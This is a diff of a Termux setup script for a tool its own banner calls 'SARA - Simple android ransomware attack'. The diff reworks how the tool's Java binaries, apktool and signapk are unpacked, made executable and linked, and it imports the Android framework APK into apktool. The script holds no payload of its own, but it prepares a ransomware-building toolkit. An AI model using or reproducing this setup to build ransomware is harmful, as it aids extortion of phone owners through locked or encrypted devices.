@@ -11,7 +11,9 @@ b="\033[1;34m"
 w="\033[0m"
 transparent="\e[0m"
 
-DIR=/data/data/com.termux/files/home
+unset LD_PRELOAD
+DIR=$HOME/SARA
+DI=/data/data/com.termux/files/home
 null="> /dev/null 2>&1"
 
 function check_root() {
@@ -26,37 +28,26 @@ exit
 fi
 }
 clear
-
-echo -e $b">"$w" SARA - Simple android ransomware attack"
-echo -e $b">"$w" prepare for installing dependencies ..."
-sleep 3
-echo -e $b">"$w" installing package: "$g"tsu"$w
-apt-get install tsu -y
-echo -e $b">"$w" installing package: "$g"imagemagick"$w
-apt-get install imagemagick -y
-echo -e $b">"$w" installing pacakge: "$g"python3"$w
-apt-get install python -y
-echo -e $b">"$w" installing modules: "$g"pillow"$w
-pip3 install Pillow
-echo -e $b">"$w" successfully installing dependencies"
-
+cp -R $DI/SARA $DIR
+cp /system/framework/framework-res.apk $DI/SARA/1.apk
 echo
 echo -e $y" [*] Setting Up Program ..."$c
 echo
-chmod 777 $DIR/SARA/.data/binaries/lib/libld.so
-chmod +x $DIR/SARA/.data/apktool
-chmod +x $DIR/SARA/.data/signapk
-chmod 777 $DIR/SARA/.data/binaries/java
-chmod 777 $DIR/SARA/.data/binaries/bin/java
-chmod 777 $DIR/SARA/.data/binaries/bin/keytool
-
+tar -xf .data/jav.tar.gz -C $PREFIX/share 
+chmod +x $PREFIX/share/bin/*
+mv $PREFIX/share/bin/* $PREFIX/bin
+chmod +x .data/apktool
+chmod +x .data/signapk
+chmod 777 .data/binaries/bin/keytool
+rm .data/jav.tar.gz > /dev/null 2>&1
 if [ -L $PREFIX/bin/apktool ]; then
 rm $PREFIX/bin/apktool
 fi
 
-ln -s $DIR/SARA/.data/apktool $PREFIX/bin/
-ln -s $DIR/SARA/.data/binaries/java $PREFIX/bin/
+ln -s $DIR/.data/apktool $PREFIX/bin/
 
+echo -e $r"Import Framework "$transparent
+sh .data/apktool if $DI/SARA/1.apk
 echo
 echo -e $g" [*] DONE!"
 sleep 1
